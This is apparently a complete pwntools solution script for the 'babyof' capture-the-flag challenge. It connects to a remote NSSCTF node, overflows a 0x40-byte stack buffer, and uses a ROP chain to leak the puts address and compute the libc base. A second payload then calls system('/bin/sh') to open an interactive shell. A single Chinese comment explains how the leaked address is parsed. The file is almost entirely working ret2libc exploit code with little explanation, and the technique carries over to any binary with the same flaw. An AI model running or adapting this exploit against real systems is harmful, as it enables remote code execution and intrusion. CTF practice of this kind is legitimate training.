from pwn import *

context(arch="amd64", os="linux", log_level="info")
context.gdb_binary = "/bin/pwndbg"
# io = process("./babyof")
io = remote("node4.anna.nssctf.cn", 29116)

elf = ELF("./babyof")
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")

ret_addr = 0x400506
pop_rdi_addr = 0x400743
begin_addr = 0x400632

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

payload = (
    b"a" * (0x40 + 8)
    + p64(pop_rdi_addr)
    + p64(puts_got)
    + p64(puts_plt)
    + p64(begin_addr)
)

io.sendafter(b"overflow?\n", payload)
puts_addr = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
"""
接收直到遇到 0x7f（因为 Linux 用户态的 libc 总是以 0x7f 开头）
[-6:] 取最后 6 个字节， 64 位地址虽然占 8 字节，但实际有效的只有低 48 位（6 字节），高 16 位是符号扩展。
"""

print("puts address = ", hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
system_addr = libc_base + libc.sym["system"]
payload = (
    b"a" * (0x40 + 8)
    + p64(ret_addr)
    + p64(pop_rdi_addr)
    + p64(bin_sh_addr)
    + p64(system_addr)
)
io.send(payload)
io.interactive()
